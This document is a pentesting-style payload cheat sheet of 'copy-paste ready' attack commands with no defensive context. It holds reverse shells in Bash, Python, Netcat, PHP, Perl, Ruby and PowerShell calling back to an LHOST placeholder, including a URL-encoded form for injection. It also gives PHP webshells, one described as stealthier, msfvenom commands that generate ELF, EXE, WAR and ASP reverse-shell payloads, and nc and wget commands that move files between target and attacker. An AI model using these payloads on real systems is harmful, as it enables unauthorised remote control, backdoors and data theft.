# Payloads Reference

Copy-paste ready reverse shells, webshells, and encoded payloads.

---

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

### Bash (URL-encoded for injection)
```
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FLHOST%2FLPORT%200%3E%261
```

### Python3
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Python3 (short)
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### Netcat (with -e)
```bash
nc -e /bin/bash LHOST LPORT
```

### Netcat (without -e — mkfifo)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LHOST LPORT >/tmp/f
```

### PHP
```bash
php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### PHP (proc_open — more reliable)
```bash
php -r '$s=fsockopen("LHOST",LPORT);$p=proc_open("/bin/bash",array(0=>$s,1=>$s,2=>$s),$pipes);'
```

### Perl
```bash
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

### PowerShell (Windows)
```powershell
$c = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$r = (iex $d 2>&1 | Out-String );$r2 = $r + 'PS ' + (pwd).Path + '> ';$sb = ([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
```

---

## Webshells

### PHP — GET parameter
```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

### PHP — POST parameter (stealthier)
```php
<?php if(isset($_POST["cmd"])){echo shell_exec($_POST["cmd"]);} ?>
```

### PHP — system() (real-time output)
```php
<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>
```

### PHP — File upload + exec
```php
<?php
if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo "Uploaded";}
if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
?>
```

---

## msfvenom Payloads

### Linux reverse shell (ELF)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell
```

### Windows reverse shell (EXE)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe
```

### PHP reverse shell
```bash
msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw > shell.php
```

### WAR (Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o shell.war
```

### ASP reverse shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f asp > shell.asp
```

---

## Shell Stabilization

After catching a reverse shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 120
```

---

## File Transfer

### Attacker → Target

```bash
# Serve on attacker
python3 -m http.server 8000

# Download on target
wget http://LHOST:8000/file
curl http://LHOST:8000/file -o file
```

### Target → Attacker

```bash
# Listener on attacker
nc -lvnp 9999 > file

# Send from target
nc LHOST 9999 < file
cat file | nc LHOST 9999
```

### Base64 transfer (no tools needed)
```bash
# On target: encode
base64 /path/to/file

# On attacker: decode
echo "BASE64DATA" | base64 -d > file
```
